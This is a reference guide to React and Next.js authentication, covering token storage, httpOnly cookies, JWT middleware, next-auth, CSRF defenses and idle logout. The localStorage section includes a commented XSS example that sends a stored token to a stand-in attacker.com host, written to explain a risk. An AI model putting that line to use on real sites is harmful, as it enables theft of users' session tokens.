# Authentication Patterns for React

Comprehensive reference covering token storage strategies, httpOnly cookie implementation, Next.js auth middleware, OAuth2/OIDC integration, CSRF protection, and session management.

---

## Token Storage Deep Dive

### localStorage — Not Recommended

```typescript
// VULNERABLE — accessible to any JavaScript on the page (including XSS)
localStorage.setItem('token', accessToken);

// An XSS attack can steal the token:
// fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))
```

### sessionStorage — Not Recommended

Same XSS vulnerability as localStorage, but token is lost when the tab closes. No security benefit over localStorage.

### In-Memory Storage — Short Sessions Only

```typescript
// Token stored in a closure — not accessible to XSS via storage APIs
// But: lost on page refresh, lost on new tab
let accessToken: string | null = null;

export function setToken(token: string) {
  accessToken = token;
}

export function getToken(): string | null {
  return accessToken;
}

export function clearToken() {
  accessToken = null;
}
```

### httpOnly Cookies — Recommended

The token is set by the server and automatically sent with requests. JavaScript cannot read or modify it:

```typescript
// Server sets the cookie — JS never touches the token
// The browser automatically includes it in same-origin requests

// Client-side fetch with credentials
const response = await fetch('/api/data', {
  credentials: 'include', // sends cookies
});
```

---

## Next.js httpOnly Cookie Implementation

### Login Endpoint

```typescript
// app/api/auth/login/route.ts
import { cookies } from 'next/headers';
import { NextResponse } from 'next/server';
import { SignJWT } from 'jose';

const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET!);

export async function POST(request: Request) {
  const { email, password } = await request.json();

  const user = await verifyCredentials(email, password);
  if (!user) {
    return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 });
  }

  const accessToken = await new SignJWT({ sub: user.id, role: user.role })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('15m')
    .sign(JWT_SECRET);

  const refreshToken = await new SignJWT({ sub: user.id, type: 'refresh' })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('7d')
    .sign(JWT_SECRET);

  const cookieStore = await cookies();

  cookieStore.set('access_token', accessToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 15 * 60,
    path: '/',
  });

  cookieStore.set('refresh_token', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 7 * 24 * 60 * 60,
    path: '/api/auth',
  });

  return NextResponse.json({ user: { id: user.id, email: user.email } });
}
```

### Token Refresh Endpoint

```typescript
// app/api/auth/refresh/route.ts
import { cookies } from 'next/headers';
import { NextResponse } from 'next/server';
import { jwtVerify, SignJWT } from 'jose';

export async function POST() {
  const cookieStore = await cookies();
  const refreshToken = cookieStore.get('refresh_token')?.value;

  if (!refreshToken) {
    return NextResponse.json({ error: 'No refresh token' }, { status: 401 });
  }

  try {
    const { payload } = await jwtVerify(refreshToken, JWT_SECRET);
    if (payload.type !== 'refresh') {
      return NextResponse.json({ error: 'Invalid token type' }, { status: 401 });
    }

    const newAccessToken = await new SignJWT({ sub: payload.sub, role: payload.role })
      .setProtectedHeader({ alg: 'HS256' })
      .setIssuedAt()
      .setExpirationTime('15m')
      .sign(JWT_SECRET);

    cookieStore.set('access_token', newAccessToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'lax',
      maxAge: 15 * 60,
      path: '/',
    });

    return NextResponse.json({ success: true });
  } catch {
    cookieStore.delete('access_token');
    cookieStore.delete('refresh_token');
    return NextResponse.json({ error: 'Invalid refresh token' }, { status: 401 });
  }
}
```

### Logout Endpoint

```typescript
// app/api/auth/logout/route.ts
import { cookies } from 'next/headers';
import { NextResponse } from 'next/server';

export async function POST() {
  const cookieStore = await cookies();
  cookieStore.delete('access_token');
  cookieStore.delete('refresh_token');
  return NextResponse.json({ success: true });
}
```

---

## Next.js Auth Middleware

### Route Protection

```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { jwtVerify } from 'jose';

const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET!);

const PUBLIC_PATHS = ['/login', '/signup', '/forgot-password', '/api/auth'];
const ADMIN_PATHS = ['/admin'];

export async function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;

  // Allow public paths
  if (PUBLIC_PATHS.some((p) => pathname.startsWith(p))) {
    return NextResponse.next();
  }

  const token = request.cookies.get('access_token')?.value;
  if (!token) {
    return NextResponse.redirect(new URL('/login', request.url));
  }

  try {
    const { payload } = await jwtVerify(token, JWT_SECRET);

    // Role-based route protection
    if (ADMIN_PATHS.some((p) => pathname.startsWith(p)) && payload.role !== 'admin') {
      return NextResponse.redirect(new URL('/unauthorized', request.url));
    }

    // Pass user info to server components via headers
    const response = NextResponse.next();
    response.headers.set('x-user-id', String(payload.sub));
    response.headers.set('x-user-role', String(payload.role));
    return response;
  } catch {
    // Token expired or invalid — try refresh
    const refreshResponse = await fetch(new URL('/api/auth/refresh', request.url), {
      method: 'POST',
      headers: { cookie: request.cookies.toString() },
    });

    if (refreshResponse.ok) {
      const response = NextResponse.next();
      // Forward the Set-Cookie headers from the refresh response
      refreshResponse.headers.getSetCookie().forEach((cookie) => {
        response.headers.append('Set-Cookie', cookie);
      });
      return response;
    }

    return NextResponse.redirect(new URL('/login', request.url));
  }
}

export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico|public/).*)'],
};
```

---

## OAuth2/OIDC with next-auth

### Configuration

```typescript
// app/api/auth/[...nextauth]/route.ts
import NextAuth from 'next-auth';
import GoogleProvider from 'next-auth/providers/google';
import GitHubProvider from 'next-auth/providers/github';
import CredentialsProvider from 'next-auth/providers/credentials';

const handler = NextAuth({
  providers: [
    GoogleProvider({
      clientId: process.env.GOOGLE_CLIENT_ID!,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
    }),
    GitHubProvider({
      clientId: process.env.GITHUB_ID!,
      clientSecret: process.env.GITHUB_SECRET!,
    }),
  ],
  callbacks: {
    async jwt({ token, user, account }) {
      if (account && user) {
        token.role = user.role ?? 'user';
        token.accessToken = account.access_token;
      }
      return token;
    },
    async session({ session, token }) {
      session.user.id = token.sub!;
      session.user.role = token.role as string;
      return session;
    },
  },
  pages: {
    signIn: '/login',
    error: '/auth/error',
  },
  session: {
    strategy: 'jwt',
    maxAge: 24 * 60 * 60, // 24 hours
  },
});

export { handler as GET, handler as POST };
```

### Protected Server Component

```typescript
// app/dashboard/page.tsx
import { getServerSession } from 'next-auth';
import { redirect } from 'next/navigation';

export default async function DashboardPage() {
  const session = await getServerSession();
  if (!session) redirect('/login');

  return <h1>Welcome, {session.user.name}</h1>;
}
```

---

## CSRF Protection

### SameSite Cookie Defense

The primary CSRF defense for modern SPAs is the `SameSite` cookie attribute:

```typescript
// SameSite=Lax: cookie sent on top-level navigations and same-origin requests
// This prevents CSRF from cross-origin form submissions and AJAX
cookieStore.set('access_token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax', // blocks cross-origin POST requests
});
```

### Double-Submit Cookie Pattern

For APIs that need extra CSRF protection (e.g., when `SameSite` cannot be used):

```typescript
// Server generates a CSRF token and sets it as a non-httpOnly cookie
// app/api/auth/csrf/route.ts
import { cookies } from 'next/headers';
import crypto from 'crypto';

export async function GET() {
  const csrfToken = crypto.randomBytes(32).toString('hex');
  const cookieStore = await cookies();

  cookieStore.set('csrf_token', csrfToken, {
    httpOnly: false, // must be readable by JS
    secure: true,
    sameSite: 'strict',
    path: '/',
  });

  return Response.json({ csrfToken });
}
```

```typescript
// Client reads the cookie and sends it as a header
function getCsrfToken(): string {
  return document.cookie
    .split('; ')
    .find((row) => row.startsWith('csrf_token='))
    ?.split('=')[1] ?? '';
}

const api = axios.create({
  baseURL: '/api',
  withCredentials: true,
  headers: { 'X-CSRF-Token': getCsrfToken() },
});
```

```typescript
// Server validates the header matches the cookie
// middleware.ts
if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(request.method)) {
  const cookieToken = request.cookies.get('csrf_token')?.value;
  const headerToken = request.headers.get('x-csrf-token');

  if (!cookieToken || cookieToken !== headerToken) {
    return NextResponse.json({ error: 'CSRF validation failed' }, { status: 403 });
  }
}
```

---

## Secure Session Management

### Session Expiry and Idle Timeout

```typescript
'use client';

import { useEffect, useCallback } from 'react';
import { useRouter } from 'next/navigation';

const IDLE_TIMEOUT = 30 * 60 * 1000; // 30 minutes

export function useIdleTimeout() {
  const router = useRouter();

  const handleActivity = useCallback(() => {
    localStorage.setItem('lastActivity', Date.now().toString());
  }, []);

  useEffect(() => {
    const events = ['mousedown', 'keydown', 'touchstart', 'scroll'];
    events.forEach((event) => window.addEventListener(event, handleActivity));

    const interval = setInterval(() => {
      const lastActivity = parseInt(localStorage.getItem('lastActivity') ?? '0');
      if (Date.now() - lastActivity > IDLE_TIMEOUT) {
        fetch('/api/auth/logout', { method: 'POST' }).then(() => {
          router.push('/login?reason=idle');
        });
      }
    }, 60_000);

    return () => {
      events.forEach((event) => window.removeEventListener(event, handleActivity));
      clearInterval(interval);
    };
  }, [handleActivity, router]);
}
```

### Multi-Tab Logout Synchronization

```typescript
'use client';

import { useEffect } from 'react';
import { useRouter } from 'next/navigation';

export function useAuthSync() {
  const router = useRouter();

  useEffect(() => {
    function handleStorageChange(event: StorageEvent) {
      if (event.key === 'logout') {
        router.push('/login');
      }
    }

    window.addEventListener('storage', handleStorageChange);
    return () => window.removeEventListener('storage', handleStorageChange);
  }, [router]);
}

// Trigger logout across all tabs
export function logoutAllTabs() {
  localStorage.setItem('logout', Date.now().toString());
  localStorage.removeItem('logout');
}
```
